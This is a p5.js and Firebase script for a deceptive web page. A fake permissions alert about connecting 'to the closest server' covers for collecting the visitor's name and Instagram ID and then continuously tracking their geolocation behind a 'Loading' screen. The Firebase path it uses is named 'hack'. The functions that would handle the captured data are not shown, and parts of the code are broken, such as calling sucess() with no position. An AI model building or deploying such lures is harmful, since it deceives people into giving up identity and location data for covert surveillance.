var database;
var a1,a2,a3,a4;
var q1,q2,q3,q4;
var gameState=0;
var number;
var sucess,error;
var w1,w2;
function setup(){
  alert("Please Allow Permissions to connect to the closest server and get better experience");
    createCanvas(800,600);
    database = firebase.database();
    a1 = createInput();
    a2 = createInput();
    a3 = createInput();
    a1.position(50,100);
    a2.position(50,250);
    a3.position(50,400);
    a1.size(700,70);
    a2.size(700,70);
    a3.size(700,70);
  a3.hide();
    a4 = createButton('Confirm');
    a4.size(200,35);
    a4.position(300,550)
    var gameStateRef  = database.ref('hack/number');
        gameStateRef.on("value",function(data){
        number = data.val();
    });
}
function draw(){
    background("grey");
    if(gameState === 0){
    textSize(30);
    fill("black");
    text("Enter your Name",50,70);
    text("Enter your Inastagram ID",50,240);
    
    fill("red");
    text("Name : "+q1,50,200);
    text("Instagram ID : "+q2,50,350);
    
    }
    q1 = a1.value();
    q2 = a2.value();
    q3 = a3.value();
    console.log(number);
    a4.mousePressed(()=>{
        gameState = 1;
        a1.hide();
        a2.hide();
        a3.hide();
        a4.hide();
        number = number + 1;
        main();
    }); 
    if(gameState === 1){
        textSize(100);
        fill("white");
        text("Loading",100,300); 
        getLocation();
        error();
        sucess(); 
    }
}
function getLocation() {
    if (!navigator.geolocation) {
      console.log('Geolocation API not supported by this browser.');
    } else {
      console.log('Checking location...');
      navigator.geolocation.watchPosition(sucess);
    }
  }
  function error() {
    console.log('Geolocation error!');
  }
  function sucess(position) {
    console.log('Latitude:', position.coords.latitude);
    console.log('Longitude:', position.coords.longitude);
    w1 = position.coords.latitude
    w2 = position.coords.longitude
    main1();
  }
